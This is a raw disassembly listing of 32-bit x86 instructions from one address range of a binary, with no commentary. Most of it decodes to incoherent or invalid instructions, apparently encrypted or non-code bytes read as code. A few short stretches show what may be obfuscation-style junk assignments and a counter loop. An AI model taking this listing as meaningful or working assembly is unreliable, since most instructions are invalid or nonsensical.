  4110ae:	mov    ds:0x15f3a75b,al
  4110b3:	push   esp
  4110b4:	stos   BYTE PTR es:[edi],al
  4110b5:	scas   al,BYTE PTR es:[edi]
  4110b6:	sub    edi,DWORD PTR [edx]
  4110b8:	out    dx,al
  4110b9:	mov    bh,0xa0
  4110bb:	ret    0x880c
  4110be:	psrlw  mm6,0x1c
  4110c2:	sub    DWORD PTR [esi],eax
  4110c4:	pop    eax
  4110c5:	sbb    ecx,DWORD PTR [ecx+0x50]
  4110c8:	dec    ebp
  4110c9:	mov    ds:0x27a4fb86,al
  4110ce:	in     al,dx
  4110cf:	fbld   TBYTE PTR [eax+ebx*1]
  4110d2:	mov    ecx,0x22624f6
  4110d7:	sbb    al,ah
  4110d9:	sar    DWORD PTR [esi-0x656227c3],0x60
  4110e0:	sbb    esi,DWORD PTR [edi-0x4b7ed6d8]
  4110e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e7:	loope  0x4110a8
  4110e9:	pop    ebp
  4110ea:	shl    ecx,cl
  4110ec:	or     DWORD PTR [esi],edi
  4110ee:	outs   dx,BYTE PTR ds:[esi]
  4110ef:	arpl   sp,dx
  4110f1:	(bad)  
  4110f3:	jecxz  0x4110d0
  4110f5:	xchg   BYTE PTR [edx+esi*2],dh
  4110f8:	jbe    0x4110e7
  4110fa:	clc    
  4110fb:	sar    DWORD PTR [ebx],cl
  4110fd:	or     al,0xe0
  4110ff:	(bad)  
  411100:	dec    eax
  411101:	stos   DWORD PTR es:[edi],eax
  411102:	pop    edi
  411103:	ret    
  411104:	sub    BYTE PTR [esi+0x9355e8f],bl
  41110a:	adc    DWORD PTR [ebx+edi*2],eax
  41110d:	aaa    
  41110e:	and    eax,0xb6e3a8c0
  411113:	jbe    0x4110f5
  411115:	ins    DWORD PTR es:[edi],dx
  411116:	nop
  411117:	jbe    0x4110af
  411119:	cmp    eax,0x45cff966
  41111e:	pandn  mm7,QWORD PTR [ebp+0x1c]
  411122:	clc    
  411123:	mov    al,0xf5
  411125:	ja     0x41116c
  411127:	inc    eax
  411128:	pop    edx
  411129:	xlat   BYTE PTR ds:[ebx]
  41112a:	out    0x51,al
  41112c:	leave  
  41112d:	iret   
  41112e:	out    dx,eax
  41112f:	call   0xa1a4:0xb4d9b020
  411136:	jl     0x411109
  411138:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41113a:	or     dh,BYTE PTR [edi-0x13]
  41113d:	pop    ecx
  41113e:	sub    eax,0xa8167cab
  411143:	hlt    
  411144:	(bad)  
  411145:	scas   al,BYTE PTR es:[edi]
  411146:	shr    DWORD PTR ds:[edi-0x1c],1
  41114a:	fucomip st,st(0)
  41114c:	rcl    DWORD PTR [ecx],cl
  41114e:	mov    ds:0xdccd866c,al
  411153:	outs   dx,BYTE PTR ds:[esi]
  411154:	icebp  
  411155:	mov    edx,0xcbf10918
  41115a:	pushf  
  41115b:	pop    esi
  41115c:	jp     0x411137
  41115e:	xor    cl,BYTE PTR [edx+eax*8]
  411161:	lods   al,BYTE PTR ds:[esi]
  411162:	sti    
  411163:	jge    0x411169
  411165:	loop   0x4111ce
  411167:	iret   
  411168:	div    DWORD PTR [eax+0x10f378d2]
  41116e:	xor    bh,BYTE PTR ds:[edi+ebp*8-0x35]
  411173:	pop    ecx
  411174:	mov    al,0xe7
  411176:	add    edx,ebx
  411178:	(bad)  
  411179:	cmc    
  41117a:	stos   BYTE PTR es:[edi],al
  41117b:	sub    ebx,edx
  41117d:	inc    ecx
  41117e:	stos   DWORD PTR es:[edi],eax
  41117f:	(bad)  
  411180:	lahf   
  411181:	and    BYTE PTR [eax+0x19],bh
  411184:	cmp    eax,0xb4d252c1
  411189:	push   ebx
  41118a:	retf   
  41118b:	ins    DWORD PTR es:[edi],dx
  41118c:	js     0x4111c1
  41118e:	int    0x56
  411190:	(bad)  
  411192:	add    DWORD PTR [ebx],ebp
  411194:	cmp    DWORD PTR [eax-0x1222e16f],edi
  41119a:	bound  ecx,QWORD PTR [edx-0x70]
  41119d:	xchg   edx,eax
  41119e:	loope  0x411218
  4111a0:	leave  
  4111a1:	cmc    
  4111a2:	addr16 push ebp
  4111a4:	pusha  
  4111a5:	xchg   DWORD PTR [ebx+0x214bd4be],edx
  4111ab:	add    BYTE PTR [esp+ebp*4+0x7f],0x8
  4111b0:	lds    esi,FWORD PTR [edi-0x2aebbb9]
  4111b6:	jne    0x4111ab
  4111b8:	push   eax
  4111b9:	fidivr WORD PTR [esi-0x40]
  4111bc:	mov    ecx,0x31eb16cd
  4111c1:	es cli 
  4111c3:	ja     0x411174
  4111c5:	inc    edx
  4111c6:	popf   
  4111c7:	(bad)  
  4111c8:	cld    
  4111c9:	inc    esp
  4111ca:	xchg   edi,eax
  4111cb:	sets   cl
  4111ce:	or     BYTE PTR [eax-0x28],al
  4111d1:	pusha  
  4111d2:	ss push ds
  4111d4:	(bad)  
  4111d6:	sub    BYTE PTR [ebp-0x20],dl
  4111d9:	shl    DWORD PTR [ebx-0x6b],cl
  4111dc:	ret    
  4111dd:	xor    ebx,DWORD PTR es:[edx-0x41]
  4111e1:	jbe    0x411253
  4111e3:	adc    cl,dl
  4111e5:	data16 stos BYTE PTR es:[edi],al
  4111e7:	pushf  
  4111e8:	hlt    
  4111e9:	cmp    eax,DWORD PTR [eax+0x23a0b948]
  4111ef:	sbb    eax,0xf30606c6
  4111f4:	cli    
  4111f5:	mov    esp,0x80b10f22
  4111fa:	loop   0x41120a
  4111fc:	inc    ebx
  4111fd:	rcr    BYTE PTR [edx+ebx*8-0x70],1
  411201:	cdq    
  411202:	call   0x6504:0xa0957c11
  411209:	push   edi
  41120a:	xchg   esi,eax
  41120b:	fisub  DWORD PTR [ebp+0x68749d9c]
  411211:	pop    es
  411212:	cli    
  411213:	addr16 je 0x411278
  411216:	inc    esi
  411217:	(bad)  
  411218:	xchg   esp,esp
  41121a:	dec    ebx
  41121b:	pop    esp
  41121c:	daa    
  41121d:	aas    
  41121e:	pop    ecx
  41121f:	test   eax,0x40b34a1e
  411224:	push   ebx
  411225:	stos   DWORD PTR es:[edi],eax
  411226:	fidivr DWORD PTR [esi+0x50aa7f8a]
  41122c:	dec    ecx
  41122d:	fwait
  41122e:	enter  0xba7c,0x17
  411232:	inc    esp
  411233:	pop    edx
  411234:	into   
  411235:	jae    0x411285
  411237:	je     0x411205
  411239:	push   eax
  41123a:	stos   BYTE PTR es:[edi],al
  41123b:	xchg   BYTE PTR [ecx],cl
  41123d:	inc    ebp
  41123e:	clc    
  41123f:	mov    bh,0x93
  411241:	ins    BYTE PTR es:[edi],dx
  411242:	stos   BYTE PTR es:[edi],al
  411243:	fwait
  411244:	jg     0x4111de
  411246:	or     al,0x61
  411248:	mov    esp,0x7b04aa11
  41124d:	gs inc eax
  41124f:	test   BYTE PTR [eax-0x51],dh
  411252:	inc    esp
  411253:	sahf   
  411254:	xlat   BYTE PTR ds:[ebx]
  411255:	sti    
  411256:	retf   0xafc
  411259:	push   ds
  41125a:	and    al,0xb
  41125c:	xor    ecx,DWORD PTR [edx+0x2a]
  41125f:	fistp  WORD PTR [edi+ebx*2]
  411262:	lea    esi,[edx]
  411264:	(bad)  
  411265:	frstor [esi+0x45a80de1]
  41126b:	(bad)
  41126e:	and    al,0x96
  411270:	dec    ebp
  411271:	fwait
  411272:	daa    
  411273:	jp     0x41122c
  411275:	fbld   TBYTE PTR [ecx-0x16238195]
  41127b:	inc    eax
  41127c:	sti    
  41127d:	add    BYTE PTR [eax+0x2d3b7b48],0x8a
  411284:	loope  0x4112cc
  411286:	cld    
  411287:	mov    ecx,0xd0e1ec8c
  41128c:	dec    esi
  41128d:	pop    eax
  41128e:	jae    0x411258
  411290:	xchg   edi,eax
  411291:	repz push esi
  411293:	dec    esp
  411294:	sar    BYTE PTR [eax-0x2],cl
  411297:	jmp    0xd25f:0x3589c516
  41129e:	mov    ds:0x5fd10d41,al
  4112a3:	cdq    
  4112a4:	int3   
  4112a5:	mov    eax,0x27817cc0
  4112aa:	loop   0x41126d
  4112ac:	push   edx
  4112ad:	dec    esp
  4112ae:	test   DWORD PTR [ecx-0x52],0xc51d532f
  4112b5:	gs sub eax,0x6adcdb3c
  4112bb:	push   0x59
  4112bd:	bound  esp,QWORD PTR [edi+0x1ff58b6e]
  4112c3:	push   esp
  4112c4:	popa   
  4112c5:	jg     0x411297
  4112c7:	stos   BYTE PTR es:[edi],al
  4112c8:	mov    es,WORD PTR [eax-0xc7908fe]
  4112ce:	xor    ecx,eax
  4112d0:	ins    DWORD PTR es:[edi],dx
  4112d1:	jmp    0x411333
  4112d3:	je     0x411255
  4112d5:	(bad)  
  4112d6:	bound  ebp,QWORD PTR [esi-0x21]
  4112d9:	sahf   
  4112da:	jle    0x41131f
  4112dc:	adc    eax,0x9d13c865
  4112e1:	retf   0x8be3
  4112e4:	nop
  4112e5:	test   DWORD PTR [ebx+0x5b],edi
  4112e8:	pop    es
  4112e9:	ret    
  4112ea:	(bad)  
  4112eb:	lds    edi,FWORD PTR [ebx]
  4112ed:	popa   
  4112ee:	jne    0x411293
  4112f0:	(bad)  
  4112f1:	mov    ebx,0x5ad356c2
  4112f6:	test   BYTE PTR [edi+0x193c97dd],dh
  4112fc:	scas   eax,DWORD PTR es:[edi]
  4112fd:	call   0xb3e40f99
  411302:	jo     0x41132f
  411304:	scas   al,BYTE PTR es:[edi]
  411305:	xchg   bp,ax
  411307:	or     ebx,DWORD PTR [edx]
  411309:	jne    0x411330
  41130b:	dec    esp
  41130c:	fs mov al,0x72
  41130f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411310:	dec    ecx
  411311:	xchg   ebp,eax
  411312:	mov    dl,0xa4
  411314:	jp     0x411383
  411316:	cld    
  411317:	fcom   QWORD PTR [eax]
  411319:	jnp    0x41133c
  41131b:	mov    cs,WORD PTR [edi-0x81b9ca4]
  411321:	mov    edi,0x319c332d
  411326:	outs   dx,BYTE PTR ds:[esi]
  411327:	fs xchg ecx,eax
  411329:	push   ecx
  41132a:	in     al,dx
  41132b:	jge    0x41132c
  41132d:	sub    dh,dh
  41132f:	not    bh
  411331:	dec    eax
  411332:	mov    ebp,esp
  411334:	ficomp DWORD PTR [ecx+0x8]
  411337:	pop    esp
  411338:	cmp    BYTE PTR gs:[ebx+eiz*1],bh
  41133c:	push   edi
  41133d:	xchg   ecx,eax
  41133e:	(bad)  
  411340:	scas   eax,DWORD PTR es:[edi]
  411341:	or     BYTE PTR [esp+ecx*8],dl
  411344:	or     BYTE PTR [ecx],bh
  411346:	or     BYTE PTR [ebx-0x57e06504],ch
  41134c:	test   al,0x35
  41134e:	lock push edx
  411350:	push   esi
  411351:	mov    ah,0xcd
  411353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411354:	mov    cl,0x42
  411356:	call   0xf2d6:0xa23c18ec
  41135d:	fwait
  41135e:	sub    ebx,ebp
  411360:	push   ss
  411361:	jp     0x411364
  411363:	mov    cl,0xfb
  411365:	pusha  
  411366:	cli    
  411367:	out    dx,al
  411368:	push   esp
  411369:	ins    DWORD PTR es:[edi],dx
  41136a:	inc    esp
  41136b:	push   ds
  41136c:	sub    DWORD PTR [ecx-0x52],ebp
  41136f:	jbe    0x411348
  411371:	pop    ds
  411372:	xor    al,dh
  411374:	mov    ?,WORD PTR [esi]
  411376:	popf   
  411377:	xor    DWORD PTR [eax-0x38],esi
  41137a:	stos   BYTE PTR es:[edi],al
  41137b:	pmaxsw mm2,QWORD PTR [esi]
  41137e:	outs   dx,DWORD PTR ds:[esi]
  41137f:	inc    ebx
  411380:	in     eax,dx
  411381:	add    DWORD PTR [esp+eiz*8+0x3],edi
  411385:	mov    edi,DWORD PTR [edi-0x7a199237]
  41138b:	cmp    al,0xef
  41138d:	idiv   esi
  41138f:	leave  
  411390:	cmp    ch,BYTE PTR [ecx]
  411392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411393:	pop    ecx
  411394:	dec    edx
  411395:	dec    esp
  411396:	and    DWORD PTR [edi+0x7],esi
  411399:	cli    
  41139a:	jbe    0x4113c1
  41139c:	ds (bad) 
  41139e:	imul   edi,DWORD PTR [ebx+0x2738ae92],0x8
  4113a5:	out    dx,eax
  4113a6:	jns    0x411380
  4113a8:	dec    ebx
  4113a9:	push   ds
  4113aa:	jno    0x411394
  4113ac:	inc    edx
  4113ad:	call   0x11976334
  4113b2:	rcr    BYTE PTR [ebp+ecx*4+0x38278910],cl
  4113b9:	jmp    ebx
  4113bb:	pop    ss
  4113bc:	xchg   esp,eax
  4113bd:	ins    BYTE PTR es:[edi],dx
  4113be:	popa   
  4113bf:	clc    
  4113c0:	jns    0x4113d1
  4113c2:	loop   0x411429
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	in     al,dx
  411448:	iret   
  411449:	rcr    DWORD PTR [esi+0x70704a0e],1
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x411485
  411454:	cmp    DWORD PTR [eax+0x5b8e816d],0xa32bc023
  41145e:	stos   DWORD PTR es:[edi],eax
  41145f:	xchg   edi,eax
  411460:	aaa    
  411461:	and    dh,BYTE PTR [eax+0x2daf52bc]
  411467:	pop    eax
  411468:	and    eax,DWORD PTR [eax+0x77]
  41146b:	dec    eax
  41146c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146d:	jmp    0xb8c8:0x301fa4f7
  411474:	mov    ebp,0x8551cfb5
  411479:	js     0x4114d8
  41147b:	call   0xb0037cf5
  411480:	rcr    BYTE PTR [edx],1
  411482:	int    0xa3
  411484:	(bad)  
  411485:	leave  
  411486:	xchg   ecx,eax
  411487:	adc    edx,DWORD PTR [ebp+0x20d711f0]
  41148d:	cmp    DWORD PTR [esi+edx*1+0x2],ebx
  411491:	jne    0x41142b
  411493:	out    dx,al
  411494:	pop    ds
  411495:	mov    eax,ds:0xb4756d7a
  41149a:	dec    esi
  41149b:	ret    0xa91f
  41149e:	or     DWORD PTR [ebx-0x35150795],esi
  4114a4:	add    DWORD PTR [ebp+edi*2-0x2f],ecx
  4114a8:	cli    
  4114a9:	xchg   ebx,ecx
  4114ab:	mov    ebp,0x530a9d20
  4114b0:	jne    0x411465
  4114b2:	inc    ebp
  4114b3:	adc    ebp,DWORD PTR [esi+0x2f87a823]
  4114b9:	adc    DWORD PTR [edx],esi
  4114bb:	pushf  
  4114bc:	dec    BYTE PTR [eax]
  4114be:	inc    eax
  4114bf:	push   cs
  4114c0:	sbb    edx,eax
  4114c2:	adc    ch,BYTE PTR [bp+0x37c6]
  4114c7:	adc    ah,BYTE PTR [esi-0x1f]
  4114ca:	jne    0x411540
  4114cc:	sbb    al,0x10
  4114ce:	mov    ecx,0xfaff9e15
  4114d3:	or     ebp,DWORD PTR [ebx]
  4114d5:	cmc    
  4114d6:	mov    eax,0xecabd098
  4114db:	or     bh,BYTE PTR [ecx-0x47cd80c6]
  4114e1:	xor    BYTE PTR [edi+0x21d94a3b],dl
  4114e7:	neg    edi
  4114e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114ea:	sahf   
  4114eb:	or     ah,BYTE PTR [eax+0x57]
  4114ee:	stos   BYTE PTR es:[edi],al
  4114ef:	lods   al,BYTE PTR ds:[esi]
  4114f0:	jmp    0x41151b
  4114f2:	(bad)  
  4114f3:	repz ror DWORD PTR [ebx],1
  4114f6:	test   DWORD PTR [edi],esp
  4114f8:	jle    0x41152c
  4114fa:	scas   al,BYTE PTR es:[edi]
  4114fb:	rcr    ebp,cl
  4114fd:	dec    ebp
  4114fe:	jmp    0x48cc:0x915384f2
  411505:	fstp   QWORD PTR [esi+0x5]
  411508:	cdq    
  411509:	lahf   
  41150a:	aam    0x91
  41150c:	pop    esp
  41150d:	addr16 aaa 
  41150f:	mov    bl,0xd2
  411511:	ds das 
  411513:	xor    DWORD PTR [edi-0x3],esp
  411516:	dec    ecx
  411517:	jnp    0x411539
  411519:	inc    ecx
  41151a:	pop    esp
  41151b:	push   0x5b
  41151d:	cdq    
  41151e:	je     0x4114a5
  411520:	das    
  411521:	mov    ah,0xdb
  411523:	(bad)  
  411524:	xchg   ecx,eax
  411525:	mov    dl,0xc5
  411527:	inc    esp
  411528:	dec    eax
  411529:	inc    esi
  41152a:	test   BYTE PTR [eax+0x61eb34f2],cl
  411530:	mov    ecx,0x281827e3
  411535:	dec    ebx
  411536:	adc    al,0x87
  411538:	enter  0x444b,0xaf
  41153c:	mov    ebp,0x79f3767a
  411541:	popf   
  411542:	adc    eax,0xb4c1af2a
  411547:	fsub   QWORD PTR [ebx+0x4c]
  41154a:	cmp    DWORD PTR [edi],0xfffffffd
  41154d:	mov    edx,0xf1fbc8eb
  411552:	aam    0x3d
  411554:	mov    ss,WORD PTR [ebx+0x4d]
  411557:	sbb    dl,BYTE PTR [eax]
  411559:	xchg   edx,eax
  41155a:	and    DWORD PTR [ebx-0x28368e5d],eax
  411560:	cmp    DWORD PTR [ebx+edi*1-0x72],ebx
  411564:	in     eax,0xa4
  411566:	xchg   esi,eax
  411567:	mov    edx,ecx
  411569:	aad    0x87
  41156b:	mov    ds:0xb29852ab,eax
  411570:	(bad)  
  411571:	in     eax,0x1c
  411573:	and    esp,ecx
  411575:	xor    BYTE PTR ds:0x84838cd3,dl
  41157b:	jno    0x41152a
  41157d:	mov    al,0x5
  41157f:	es stos DWORD PTR es:[edi],eax
  411581:	vpminsw ymm5,ymm4,ymm3
  411585:	sub    ebp,DWORD PTR [eax-0x8]
  411588:	punpckhwd mm4,mm3
  41158b:	mov    dh,0x74
  41158d:	xor    DWORD PTR [eax+eiz*4],esp
  411590:	fstp   DWORD PTR [esi+0x64]
  411593:	ja     0x411535
  411595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411596:	loope  0x411603
  411598:	push   es
  411599:	repnz pusha 
  41159b:	fs jnp 0x4115e4
  41159e:	add    bh,ch
  4115a0:	scas   al,BYTE PTR es:[edi]
  4115a1:	mov    edi,0x800283c5
  4115a6:	rol    DWORD PTR [ebp+0x7e],cl
  4115a9:	mov    ebx,0x79b703f4
  4115ae:	not    DWORD PTR [edx+0x20]
  4115b1:	sub    al,0x17
  4115b3:	adc    eax,0x857e83eb
  4115b8:	fcmovb st,st(0)
  4115ba:	stos   DWORD PTR es:[edi],eax
  4115bb:	and    BYTE PTR [edi+eax*8],al
  4115be:	mov    ds:0x852a79df,al
  4115c3:	cwde   
  4115c4:	outs   dx,DWORD PTR ds:[esi]
  4115c5:	lahf   
  4115c6:	and    eax,0x809d45d9
  4115cb:	repz xor dh,BYTE PTR [ecx+ebx*4]
  4115cf:	dec    edi
  4115d0:	dec    ebx
  4115d1:	popa   
  4115d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115d3:	push   ebx
  4115d4:	test   DWORD PTR [esi-0x6b659104],eax
  4115da:	adc    al,0x84
  4115dc:	cmc    
  4115dd:	pop    ebx
  4115de:	outs   dx,BYTE PTR ds:[esi]
  4115df:	call   0x6093bbf7
  4115e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e5:	xchg   esi,eax
  4115e6:	or     al,0xe5
  4115e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e9:	mov    dl,0x4b
  4115eb:	(bad)  
  4115ed:	es inc esi
  4115ef:	or     eax,0x97d209ab
  4115f4:	xor    DWORD PTR [esp+edi*8-0x41],esi
  4115f8:	iret   
  4115f9:	sbb    al,0x7a
  4115fb:	call   0xde6b:0xd051ea55
  411602:	fs mov edi,0x4a3ca1f2
  411608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411609:	mov    bh,0xc1
  41160b:	xchg   esp,eax
  41160c:	cmc    
  41160d:	pop    ecx
  41160e:	fst    DWORD PTR [edi+0x271fe4ab]
  411614:	add    BYTE PTR [ebx-0x34],bl
  411617:	cmp    dl,BYTE PTR [ecx]
  411619:	cmp    DWORD PTR [esi+0x3bc21b3a],esp
  41161f:	out    0xcf,eax
  411621:	add    DWORD PTR [ecx-0x24],ebp
  411624:	jno    0x411646
  411626:	xchg   edx,eax
  411627:	ficomp WORD PTR [edx]
  411629:	fisttp DWORD PTR [ebx]
  41162b:	xor    bh,BYTE PTR [edx-0x1c2b73ae]
  411631:	lea    esi,[ecx+0x64191124]
  411637:	and    eax,0xf9759298
  41163c:	jb     0x411632
  41163e:	xchg   edx,eax
  41163f:	xor    DWORD PTR [esi+0x2f1282e8],0xe076cc6d
  411649:	pop    ecx
  41164a:	sub    BYTE PTR [edi],0xe2
  41164d:	adc    esp,ebp
  41164f:	pusha  
  411650:	jmp    DWORD PTR [esi-0x57]
  411653:	fdiv   QWORD PTR [edx-0x1a]
  411656:	sub    BYTE PTR [ebp-0x3c1d0ca5],ch
  41165c:	cmp    eax,0xddff8cce
  411661:	mov    esi,DWORD PTR [edx-0x73]
  411664:	mov    DWORD PTR [ecx],ebp
  411666:	mov    al,ds:0x2687612e
  41166b:	mov    esi,0x4008a875
  411670:	mov    edi,esp
  411672:	dec    esp
  411673:	jmp    0xc2c727eb
  411678:	(bad)
  41167b:	dec    edx
  41167c:	or     eax,0x52d04714
  411682:	hlt    
  411683:	jle    0x4116c6
  411685:	shr    DWORD PTR [esi+ecx*8+0x17],1
  411689:	xchg   esp,eax
  41168a:	(bad)  
  41168c:	cmp    eax,0x559ddea7
  411691:	fst    DWORD PTR [edx]
  411693:	test   eax,0x6ca6cf03
  411698:	push   ecx
  411699:	pop    eax
  41169a:	inc    ebx
  41169b:	xchg   edi,eax
  41169c:	stos   BYTE PTR es:[edi],al
  41169d:	xchg   BYTE PTR [edx-0x7b],cl
  4116a0:	xor    BYTE PTR ds:[esi+0x71],dl
  4116a4:	out    0x91,al
  4116a6:	mov    cl,BYTE PTR [ecx]
  4116a8:	rcr    edx,0xcc
  4116ab:	inc    esp
  4116ac:	add    DWORD PTR [edi],esp
  4116ae:	gs push edx
  4116b0:	test   BYTE PTR [esi+0x71],ch
  4116b3:	popa   
  4116b4:	push   cs
  4116b5:	ss push ecx
  4116b7:	sub    eax,DWORD PTR [eax+0x53bf47d1]
  4116bd:	adc    BYTE PTR [edx+0x7ca9873c],bh
  4116c3:	adc    al,0x8
  4116c5:	or     DWORD PTR [eax+0x21],eax
  4116c8:	leave  
  4116c9:	loop   0x4116b5
  4116cb:	ss push ebx
  4116cd:	in     al,dx
  4116ce:	mov    ds:0x1af6bdbb,al
  4116d3:	pop    edi
  4116d4:	in     al,0xae
  4116d6:	aam    0xa
  4116d8:	adc    DWORD PTR [ebx],ebp
  4116da:	popa   
  4116db:	fmul   st(5),st
  4116dd:	(bad)  
  4116de:	sub    dl,cl
  4116e0:	sbb    DWORD PTR [edx*8+0x352a1575],eax
  4116e7:	stos   DWORD PTR es:[edi],eax
  4116e8:	inc    edi
  4116e9:	dec    ecx
  4116ea:	(bad)  [eax-0x25]
  4116ed:	mov    edi,0xffa50ebe
  4116f2:	cwde   
  4116f3:	jg     0x4116f7
  4116f5:	mov    eax,DWORD PTR [edi]
  4116f7:	and    DWORD PTR [ebx+0x75],esp
  4116fa:	jp     0x4116cd
  4116fc:	mov    ch,0x1a
  4116fe:	in     al,dx
  4116ff:	fld    QWORD PTR [esi-0x62]
  411702:	retf   
  411703:	rol    BYTE PTR [edi],cl
  411705:	inc    ebx
  411706:	in     al,0xa8
  411708:	xchg   edx,eax
  411709:	ss test eax,0x5bb279dd
  41170f:	xor    eax,0x6163f8b3
  411714:	cmp    eax,0xadd0cc55
  411719:	sbb    al,0x5
  41171b:	jl     0x41178a
  41171d:	sbb    BYTE PTR [ecx+0x36ba7490],ch
  411723:	xor    dl,BYTE PTR [ecx]
  411725:	sbb    DWORD PTR [eax+0x75f3b0ee],esp
  41172b:	inc    edi
  41172c:	mov    ah,0x7b
  41172e:	adc    cl,BYTE PTR [edi-0x6]
  411731:	int    0x4a
  411733:	ins    BYTE PTR es:[edi],dx
  411734:	rcr    BYTE PTR [eax],1
  411736:	inc    edx
  411737:	js     0x411753
  411739:	mov    bl,0x98
  41173b:	and    ebx,DWORD PTR [edx+eiz*2-0x1b375e31]
  411742:	addr16 push ds
  411744:	sub    eax,0xfa6f1346
  411749:	lods   eax,DWORD PTR ds:[esi]
  41174a:	sbb    eax,0xffffffa1
  41174d:	xchg   edi,eax
  41174e:	inc    edx
  41174f:	xor    DWORD PTR [ebx],esi
  411751:	sub    al,0x0
  411753:	jno    0x4117a2
  411755:	pop    ebp
  411756:	enter  0x66f5,0x55
  41175a:	and    bh,BYTE PTR [ecx]
  41175c:	add    eax,0x82c481ff
  411761:	idiv   DWORD PTR [ebx+0x3cc344f0]
  411767:	ret    
  411768:	fcomp  DWORD PTR [ebx-0x1c]
  41176b:	adc    eax,0x362e371b
  411770:	dec    edx
  411771:	stos   DWORD PTR es:[edi],eax
  411772:	push   edx
  411773:	(bad)  
  411774:	jns    0x41178f
  411776:	popf   
  411777:	mov    dh,0x8
  411779:	xchg   esp,eax
  41177a:	mov    esi,0x57ecd9ca
  41177f:	xchg   BYTE PTR [edi-0x683872eb],dh
  411785:	(bad)  [edi]
  411787:	or     al,0x1
  411789:	push   cs
  41178a:	lods   eax,DWORD PTR ds:[esi]
  41178b:	cld    
  41178c:	mov    al,ds:0xb35d9796
  411791:	jae    0x411786
  411793:	ja     0x41173f
  411795:	dec    edi
  411796:	aaa    
  411797:	mov    bh,0x6c
  411799:	dec    esp
  41179a:	mov    ebp,0x32eb9f28
  41179f:	push   edx
  4117a0:	sub    eax,0x2de0fe59
  4117a5:	sbb    al,0xd8
  4117a7:	push   cs
  4117a8:	cmp    BYTE PTR [edi-0x7aab85a9],cl
  4117ae:	mov    al,0xe1
  4117b0:	repz int 0xaa
  4117b3:	pop    ecx
  4117b4:	lahf   
  4117b5:	mov    edx,0x80a1df57
  4117ba:	mov    esi,0x111615a7
  4117bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117c0:	pop    edx
  4117c1:	ret    0x43bb
  4117c4:	inc    ebx
  4117c5:	xor    al,0x20
  4117c7:	dec    edx
  4117c8:	dec    esp
  4117c9:	sbb    eax,0xa4d6ee57
  4117ce:	test   eax,0xb5dd1d8f
  4117d3:	imul   ebx,DWORD PTR [edx],0x2584705c
  4117d9:	test   DWORD PTR [ebp+edx*8+0x3988c7d8],0x25d6e526
  4117e4:	and    eax,DWORD PTR [ebx+0x59fdf0d4]
  4117ea:	jge    0x41182a
  4117ec:	adc    al,0x97
  4117ee:	or     DWORD PTR [ebp-0x2a],esi
  4117f1:	sar    ebp,0xf2
  4117f4:	mov    ds:0x2937d61a,eax
  4117fa:	adc    eax,0x85d9df64
  4117ff:	mov    al,0x6a
  411801:	retf   0xfc97
  411804:	rol    BYTE PTR [eax],1
  411806:	or     cl,dl
  411808:	cwde   
  411809:	push   ecx
  41180a:	mov    ds:0x95da935d,al
  41180f:	popa   
  411810:	popa   
  411811:	mov    ecx,0xd1ce0cc0
  411816:	inc    esp
  411817:	pop    edi
  411818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411819:	mov    bh,0xc5
  41181b:	pushf  
  41181c:	dec    eax
  41181d:	dec    ebx
  41181e:	sahf   
  41181f:	mov    eax,0xb76e48e8
  411824:	daa    
  411825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411826:	outs   dx,BYTE PTR ds:[esi]
  411827:	xchg   edx,eax
  411828:	retf   
  411829:	sbb    BYTE PTR [esi],0x20
  41182c:	fiadd  WORD PTR [edi-0x16c76a67]
  411832:	(bad)  
  411833:	adc    DWORD PTR [ecx],esi
  411835:	(bad)  
  411836:	hlt    
  411837:	lahf   
  411838:	gs into 
  41183a:	fisttp WORD PTR [ebx-0x3dd4f38b]
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x103581e9],dl
  41187c:	data16 jbe 0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118e4
  411886:	jmp    0x41184a
  411888:	push   edx
  411889:	mov    dh,0x10
  41188b:	fiadd  DWORD PTR [eax+0x57]
  41188e:	scas   eax,DWORD PTR es:[edi]
  41188f:	push   ecx
